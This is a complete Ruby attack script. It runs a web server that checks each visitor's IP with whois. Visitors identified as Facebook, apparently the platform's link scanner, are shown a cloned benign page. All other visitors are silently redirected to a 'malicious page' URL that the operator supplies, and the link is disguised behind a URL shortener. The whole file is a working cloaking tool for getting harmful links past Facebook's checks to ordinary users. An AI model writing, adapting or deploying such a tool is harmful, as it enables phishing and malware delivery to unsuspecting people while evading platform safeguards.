#!/usr/bin/env ruby

require 'webrick'
require 'ronin/web'
require 'googl'
require 'socket'

$goodurl = "null"
$badurl = "null"

class Web < WEBrick::HTTPServlet::AbstractServlet
  def do_GET(request, response)
    ip = request.remote_ip
    puts "[+] New request from ", ip
    output = %x[whois #{ip}]
    if ( output =~ /Facebook/ )
      puts " ... IP belongs to Facebook."
      puts "  [-] Giving the cloned page."
      body = Ronin::Web.get_body($goodurl)
    else
      puts " ... IP does not belong to Facebook."
      puts "  [-] Giving a malicious page."
      body = "<html><head><meta HTTP-EQUIV=\"REFRESH\" content=\"0;url=" + $badurl + "\"></head></html>"
    end
    response.status = 200
    response['Content-Type'] = "text/html"
    response.body = body
  end
end

class Prompt
  def start
    puts "Enter URL of address to clone"
    STDOUT.flush
    $goodurl = gets.chomp
    puts "Enter URL to redirect to"
    STDOUT.flush
    $badurl = gets.chomp
    puts "[+] Finding our IP address"
    local_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
    puts " ... our ip is: " + local_ip
    puts "[+] Shortening URL for Facebook"
    url = Googl.shorten(local_ip)
    puts ""
    puts "#############################################"
    puts " [-] Shortened URL is " + url.short_url
    puts "============================================="
    puts ""
    
  end
end

if $0 == __FILE__ then
  prompt = Prompt.new
  prompt.start
  server = WEBrick::HTTPServer.new(:Port => 80,:AccessLog => [] )
  server.mount "/", Web
  trap "INT" do server.shutdown end
  server.start
end
